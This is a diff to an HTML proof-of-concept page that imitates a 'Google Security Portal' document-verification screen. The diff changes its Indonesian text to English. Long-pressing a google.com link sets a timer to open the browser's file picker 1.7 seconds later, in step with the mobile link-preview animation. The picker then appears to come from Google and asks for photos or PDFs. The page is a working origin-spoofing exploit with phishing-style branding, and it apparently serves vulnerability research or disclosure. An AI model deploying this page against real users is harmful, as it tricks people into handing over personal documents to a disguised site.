@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Security PoC - File Picker & Image Preview</title>
+    <title>File Picker Origin Spoof PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #fcfcfc;
+            background-color: #f8f9fa;
             color: #202124;
             display: flex;
             flex-direction: column;
@@ -19,14 +19,14 @@
             text-align: center;
         }
         .banner {
-            font-size: 14px;
+            font-size: 13px;
             color: #5f6368;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.8px;
         }
         h1 {
-            font-size: 22px;
+            font-size: 20px;
             color: #1a73e8;
             margin-bottom: 24px;
         }
@@ -34,12 +34,12 @@
             display: inline-block;
             background-color: #1a73e8;
             color: white;
-            padding: 16px 32px;
+            padding: 14px 28px;
             text-decoration: none;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 15px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
         }
         a.spoof-link:active {
@@ -47,23 +47,24 @@
         }
         .preview-container {
             margin-top: 25px;
-            max-width: 300px;
+            max-width: 280px;
             display: none;
         }
         .preview-container img {
             width: 100%;
             border-radius: 8px;
             border: 1px solid #dadce0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
         }
         .file-info {
             margin-top: 10px;
             font-size: 13px;
             color: #5f6368;
+            word-break: break-all;
         }
         .footer-note {
             margin-top: 30px;
-            font-size: 12px;
+            font-size: 11px;
             color: #9aa0a6;
         }
     </style>
@@ -71,35 +72,33 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Verifikasi Dokumen Pengguna</h1>
+    <h1>Secure Document Verification</h1>
 
-    <!-- Tautan target murni untuk memicu Preview Page -->
-    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page</a>
+    <!-- Target Link to trigger Preview Page -->
+    <a href="https://google.com" class="spoof-link" id="targetLink">Open Preview Page & Upload Photo</a>
 
-    <!-- Area Pratinjau Gambar yang Diunggah -->
+    <!-- Uploaded Image Preview Box -->
     <div class="preview-container" id="previewBox">
-        <img id="imagePreview" src="" alt="Pratinjau Berkas">
+        <img id="imagePreview" src="" alt="File Preview">
         <div class="file-info" id="fileInfo"></div>
     </div>
 
-    <div class="footer-note">Sistem verifikasi aman berbasis cloud.</div>
+    <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
         let triggered = false;
 
-        // Fungsi eksekusi utama File System Access API
         const executeAttackVector = () => {
             if (triggered) return;
             triggered = true;
 
-            // Timer dioptimalkan agar pas dengan durasi animasi preview page terbuka
+            // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
                 try {
-                    // Mengubah tipe penerimaan agar mendukung gambar untuk preview
                     const [fileHandle] = await window.showOpenFilePicker({
                         multiple: false,
                         types: [{
-                            description: 'Gambar & Dokumen',
+                            description: 'Images & Documents',
                             accept: { 
                                 'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
                                 'application/pdf': ['.pdf']
@@ -107,14 +106,12 @@
                         }]
                     });
 
-                    // Mengambil data file yang dipilih pengguna
                     const file = await fileHandle.getFile();
                     
-                    // Menampilkan informasi nama file
-                    const fileInfo = document.getElementById("fileInfo");
-                    fileInfo.innerText = `File terpilih: ${file.name}`;
+                    // Display selected file name
+                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;
 
-                    // Jika file berupa gambar, tampilkan pratinjaunya di halaman
+                    // Show image preview if applicable
                     const previewBox = document.getElementById("previewBox");
                     const imagePreview = document.getElementById("imagePreview");
                     
@@ -127,23 +124,21 @@
                     }
 
                 } catch (err) {
-                    console.debug("Aksi file picker dihentikan:", err.message);
+                    console.debug("File picker cancelled or blocked:", err.message);
                 } finally {
                     setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 1700); // 1.7 detik waktu tunggu optimal untuk ephemeral tab
+            }, 1700); // 1.7 seconds delay for ephemeral tab
         };
 
-        // Event listener untuk menangkap gestur konteks menu (long press)
+        // Event listener for context menu (Long Press)
         const targetElement = document.getElementById("targetLink");
 
-        targetElement.addEventListener("contextmenu", (e) => {
+        targetElement.addEventListener("contextmenu", () => {
             executeAttackVector();
         });
 
-        targetElement.addEventListener("touchstart", (e) => {
-            // Membantu mendeteksi interaksi sentuh awal pada perangkat seluler
-        }, { passive: true });
+        targetElement.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
